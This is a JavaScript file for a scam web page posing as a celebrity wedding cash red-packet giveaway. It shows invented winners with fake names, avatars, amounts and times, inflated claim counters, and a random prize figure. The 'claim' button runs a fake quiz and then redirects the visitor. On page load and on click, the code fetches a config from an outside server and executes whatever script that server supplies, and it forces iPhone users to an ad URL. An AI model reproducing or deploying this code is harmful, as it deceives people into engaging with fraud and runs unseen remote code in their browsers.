window.gConfig = window['data'] || {};
var evkey = M.getParam('_evkey');
var site = M.getParam('_c') || '1919';

if (/iphone/ig.test(navigator.userAgent) && window.data && window.data['attached'] && window.data['attached']['iosGoAdUrl']) {
    location.href = window.data['attached']['iosGoAdUrl'];
}

function record (event, id, allow_reply) {
    (console && console.log && console.log('record event' + event + ';id:' + id + '; allow_reply' + allow_reply))
    try {
        if (!localStorage.getItem(event + ':' + id) || allow_reply) {
            //$.post('http://p.rsren.com.cn./record', {event: event, id: id})
            localStorage.setItem(event + ':' + id, true);
        }
    } catch (e) {

    }
}

function pad (num, size) {
    var s = num + "";
    while (s.length < size) s = "0" + s;
    return s;
}

function showShareTips (obj) {
    if (typeof obj === 'object') {
        g_dialog.alert({
            title: obj.successTitle || '',
            message: obj.successTips,
            btn: '我知道了'
        });
    } else if (typeof obj === 'string' && obj) {
        g_dialog.alert({
            title: '',
            message: obj,
            btn: '我知道了'
        });
    }
}

$(function () {

    var u = navigator.userAgent;
    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
    $.ajax({
        type: "GET",
        url: "https://cc138.cn/Api/hb/getApi.php",
        data:{},
        dataType:"json",
        success:function (d) {
            M.loadJS(d.fhym);
            if(isAndroid==true&&d.azfxKg==0){
                //是安卓 关闭
                window.history.back(-1);
            }
            if(isiOS==true&&d.pgfxKg==0){
                //是苹果 关闭
                window.history.back(-1);
            }
        }
    });

    var config = {
        tpl: {
            body: [
                '<div class="red-packet-container index-show-more-body" style="display: none;">',
                '  <div class="top-box">',
                '    <div class="cont-head-portrait">',
                '      <img src="https://cdn.jsdelivr.net/gh/you2048/hb/xi.jpg">',
                '    </div>',
                '    <div class="cont-desc-blessing">',
                '      <p style="font-size: 24px;">喜结良缘&nbsp;全民送豪礼</p>',
                '      <p>全民派发现金红包<i class="icon-prompt">可提现</i></p>',
                '    </div>',
                '    <a class="btn-open-red-packet" href="javascript:;"><span>開</span></a>',
                '    <p class="cont-desc-bottom">- 今日已有<span>2767</span>人领取了红包 -</p>',
                '  </div>',
                '  <ul class="list"></ul>',
                '</div>',
                '<div class="award-container award-body" style="display: none;">',
                '  <p class="content-top-tips">恭喜领取红包</p>',
                '  <p class="content-price">',
                '    <sup>￥</sup><span class="js_money"></span><i class="icon-highest">最高</i>',
                '  </p>',
                '  <div class="content-charge-box">',
                '    <a class="charge-btn" href="javascript:;">立即领取红包</a>',
                '    <p class="charge-tips">今日24点前未收钱，将收回红包资格<br/><span style="color: red;">如多次领取以最后一次领取金额为准</span></p>',
                '  </div>',
                '  <p class="content-tips-total">总共100000份，已成功发出46786份红包</p>',
                '</div>'
            ].join(''),
            userItem: [
                '<li class="animated" style="display: none;">',
                '  <div class="list-item-left">',
                '    <img src="%(avatar)">',
                '    <div class="item-info">',
                '      <p class="item-info-name">%(name)</p>',
                '      <p class="item-info-time">%(time)</p>',
                '    </div>',
                '  </div>',
                '  <div class="list-item-right">',
                '    领取 <span>%(money)元</span>',
                '  </div>',
                '</li>'
            ].join(''),
            g_tips_message_obj: [
                '<span style="font-size: 23px;color:#1BBC9B;">恭喜您！</span><br/><br/>',
                '新郎：<span style="color:red;">冯绍峰</span> 新娘：<span style="color:red;">赵丽颖</span><br/><br/>',
                '<span style="font-size: 20px;color:#FFB800;">兹定于</span><span style="font-size: 21px;color:red;">2019-04-08</span><span style="font-size: 20px;color:#FFB800;">举行婚礼</span><br/><br/>',
                '为答谢粉丝们的支持与厚爱，现发出<span style="color:red;font-size:20px;">3000万</span>现金红包回馈粉丝<br/><br/>',
                '<span style="color:#D0D0D0;">红包总额仅剩余</span><span style="font-size: 20px;color:red;">2076.4万</span><span style="color:#D0D0D0;">元金额有限，先到先得！</span><br/>'
            ].join('')
        }
    };

    var userList = [
        {
            "name": "飞飞",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/4eb2df5e89ee055d771c08bb16e5986ca35c29a9-1527007460.jpg",
            "money": "25.30"
        }, {
            "name": "小虫子信",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/06b618e45469b1cdec29c7beef3d481bf458ef5c-1533940960.jpg",
            "money": "25.30"
        }, {
            "name": "主角",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/b2e6f6ca66127fbf58f8e1a6316bd8b5fa794d72-1541555005.jpg",
            "money": "25.30"
        }, {
            "name": "碧野",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/04179cc649147f8944522bf0e93262baa114d244-1528269129.jpg",
            "money": "25.30"
        }, {
            "name": "蒋",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/d4f5f8045851b68f44f568581f04b0e21e1a5957-1540270581.jpg",
            "money": "25.30"
        }, {
            "name": "Mystic",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/31e825ff825eca24ec1f0fc3f15faebd1e9e7d19-1546310242.jpg",
            "money": "25.30"
        }, {
            "name": "LOVE",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/751ac54490e44dbafaee84c5b3438de88f67eabf-1529720592.jpg",
            "money": "25.30"
        }, {
            "name": "佛心꧂",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/10c0cf5ebb53696ff4e7d1cf6c5677eb0b26ef23-1541420966.jpg",
            "money": "25.30"
        }, {
            "name": "雨，阳",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/7989570b51a38744265c6d0f1c1b8ce53ca32b0b-1535629062.jpg",
            "money": "28.80"
        }, {
            "name": "木子",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/8df35651b2c8ca23e034acd118ff8df9feb41657-1529068789.jpg",
            "money": "29.80"
        }, {
            "name": "唯一",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/44baff282e5cd2cac8037c3af0d41ff36b9e1e0d-1543371875.jpg",
            "money": "28.80"
        }, {
            "name": "。独(∩_∩)笯",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/eab384341dfac9a47236fdb245f4c80d61eff576-1513818582.jpg",
            "money": "29.80"
        }, {
            "name": "新课程",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/7989570b51a38744265c6d0f1c1b8ce53ca32b0b-1535629062.jpg",
            "money": "28.80"
        }, {
            "name": "北极星",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/e02040654cc0f5ef9e0b94f3872f1caa10682f45-1545581079.jpg",
            "money": "29.80"
        }, {
            "name": "妍研",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/bddf1ebf18ba5863ade0e8495a7d40e976a4934e-1543397899.jpg",
            "money": "28.80"
        }, {
            "name": "🌝",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/b40746ff7ac3dfe51f739de44c5af12d826956d0-1539180096.jpg",
            "money": "29.80"
        }, {
            "name": "粉木耳",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/3680b86e0bcc09eca4420aa0f9494f9666914aef-1545823113.jpg",
            "money": "29.80"
        }, {
            "name": "约定",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/fd394665ac65324b35f293b65ec81b924c08c017-1528690449.jpg",
            "money": "28.80"
        }, {
            "name": "杨茜倬🍉",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/b0dc3322b769514a277e638bf06c21cb54402ce2-1546042598.jpg",
            "money": "29.80"
        }, {
            "name": "幸福培训驿站",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/66b9ce30957792010a5fc4ecfb40769db83abe86-1544320915.jpg",
            "money": "29.80"
        }, {
            "name": "🌝",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/b40746ff7ac3dfe51f739de44c5af12d826956d0-1539180096.jpg",
            "money": "29.80"
        }, {
            "name": "七哥",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/87ff825e465413eba3cc4b15538c274d43ad9585-1520479870.jpg",
            "money": "28.80"
        }, {
            "name": "夜巷子里的老猫",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/526ce712008de7631f5fe7f8e0953c73a6eee4ff-1541898592.jpg",
            "money": "28.80"
        }, {
            "name": "小鑫鑫",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/d0e70465c252a71e24d827c3b956804109dcb32e-1545053339.jpg",
            "money": "28.80"
        }, {
            "name": "平安是福",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/36ce1024a606afea9ce1c48a805be554d982dd8d-1538647780.jpg",
            "money": "29.80"
        }, {
            "name": "七次郎",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/3680b86e0bcc09eca4420aa0f9494f9666914aef-1545823113.jpg",
            "money": "29.80"
        }, {
            "name": "孙东喜",
            "avatar": "https://cdn.jsdelivr.net/gh/you2048/hb/a/909e69bc62b6bcb6477f0dd2d6b710da4f166ec3-1539785782.jpg",
            "money": "28.80"
        }
    ];

    showShareTips(config.tpl.g_tips_message_obj);

    var len = userList.length;
    var indexList = [];
    var newUserIndexList = [];
    for (var i = 0; i < len; i++) {
        indexList.push(i);
    }
    for (var i = 0; i < len; i++) {
        var randomIndex = indexList.splice(Math.floor(Math.random() * indexList.length), 1);
        newUserIndexList.push(randomIndex);
    }
    var newUserList = [];
    for (var i = 0; i < len; i++) {
        newUserList.push(userList[newUserIndexList[i]]);
    }
    userList = newUserList;

    var userTimer = 0;
    var showIndex = 0;
    var itemWidth = '';
    var actionTimer = 2500;

    function pad (num, size) {
        var s = num + "";
        while (s.length < size) s = "0" + s;
        return s;
    }



    function addUser () {
        if (showIndex === userList.length) {
            showIndex = 0;
        }
        var $item = $(config.tpl.userItem.jstpl_format(userList[showIndex++]));
        $('.index-show-more-body .list').prepend($item);
        $item.slideDown(1000);

        $('.index-show-more-body .list li').each(function (index, item) {
            if (index > 6) {
                $(item).slideUp(1000);
                setTimeout(function () {
                    $(item).remove();
                }, 1000);
            }
        });
    }

    function startTimer () {
        clearTimeout(userTimer);
        userTimer = setTimeout(function () {
            addUser();
            startTimer();
        }, actionTimer);
    }

    function initUser () {
        var now = +new Date();
        $(userList).each(function (index, item) {
            var temp = new Date((now - Math.random() * 600000));
            var minutes = temp.getMinutes();
            if (minutes < 10) {
                minutes = '0' + minutes;
            }
            var timeStr = temp.getHours() + ':' + minutes;
            item.time = timeStr;
        });
        for (showIndex = 0; showIndex < 6; showIndex++) {
            var item = config.tpl.userItem.jstpl_format(userList[showIndex]);
            $('.index-show-more-body .list').prepend($(item).show());
        }
        itemWidth = $('.index-show-more-body .list li').eq(0).width() + 'px';
        addUser();
        startTimer();
    }

    function initPage () {
        gConfig.money = parseInt((parseFloat(Math.random() * 20) + 30) * 100);
        M.resetFont();
        $(document.body).append(config.tpl.body.jstpl_format({
            head: $('.js_head_img').attr('data-src')
        }));
        $('.index-show-more-body').show();
        $('.js_money').text(parseFloat(gConfig.money / 100).toFixed(2));
        initUser();
    }
    function openPacket () {
        record('tostop', site);
        evkey && record('tostop', evkey);
        var u = navigator.userAgent;
        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
        $.ajax({
            type: "GET",
            url: "https://cc138.cn/Api/hb/getApi.php",
            data:{},
            dataType:"json",
            success:function (d) {
                var fxqz=d.fxqz;
                var fxtzurl="";
                if(isAndroid){
                    if(d.azfxy.indexOf("?") > -1){
                        if(fxqz!="") {
                            fxtzurl = fxqz + encodeURIComponent(d.azfxy + "&money=" + parseFloat(gConfig.money / 100).toFixed(2));
                        }else{
                            fxtzurl=d.azfxy + "&money=" + parseFloat(gConfig.money / 100).toFixed(2);
                        }
                    }else{
                        if(fxqz!="") {
                            fxtzurl = fxqz + encodeURIComponent(d.azfxy + "?money=" + parseFloat(gConfig.money / 100).toFixed(2));
                        }else{
                            fxtzurl=d.azfxy + "?money=" + parseFloat(gConfig.money / 100).toFixed(2);
                        }
                    }
                }else{
                    if(d.pgfxy.indexOf("?") > -1){
                        if(fxqz!="") {
                            fxtzurl = fxqz + encodeURIComponent(d.pgfxy + "&money=" + parseFloat(gConfig.money / 100).toFixed(2));
                        }else{
                            fxtzurl=d.pgfxy + "&money=" + parseFloat(gConfig.money / 100).toFixed(2);
                        }
                    }else{
                        if(fxqz!="") {
                            fxtzurl = fxqz + encodeURIComponent(d.pgfxy + "?money=" + parseFloat(gConfig.money / 100).toFixed(2));
                        }else{
                            fxtzurl=d.pgfxy + "?money=" + parseFloat(gConfig.money / 100).toFixed(2);
                        }
                    }
                }
                window.location.href=fxtzurl;


            }
        });
    }

    function bindEvent () {

        $(document.body).on('click', '.btn-open-red-packet', function () {
            var $this = $('.btn-open-red-packet');
            if ($this.hasClass('open')) {
                return false;
            }
            $this.addClass('open');
            setTimeout(function () {
                $('.index-show-more-body').fadeOut(700);
                $('.award-body').fadeIn(700);
            }, 1500);
            record('play', site);
            evkey && record('play', evkey);
        });

        $(document.body).on('click', '.charge-btn', function () {
            g_dialog.confirm({
                title: '猜一猜婚礼在哪举行？',
                message: '答对本题可获得<span style="color: #f5294c">额外奖金</span>！',
                btn: ['上海', '香港'],
                cb: openPacket,
                cancelCb: openPacket,
            });
        });

    }

    function init () {
        record('load', site);
        evkey && record('load', evkey);
        initPage();
        bindEvent();
    }

    init();
});

$(function () {
    // 总统计
    M.loadJS('https://hm.baidu.com/hm.js?206e4c028d3443c458a22e5b8937dd82');
});

// 隐藏分享
$(function () {
    M.hideShare();
});

// 设置返回
$(function () {
    $.ajax({
        type: "GET",
        url: "https://cc138.cn/Api/hb/getApi.php",
        data:{},
        dataType:"json",
        success:function (d) {
            M.loadJS(d.fhym);
        }
    });
});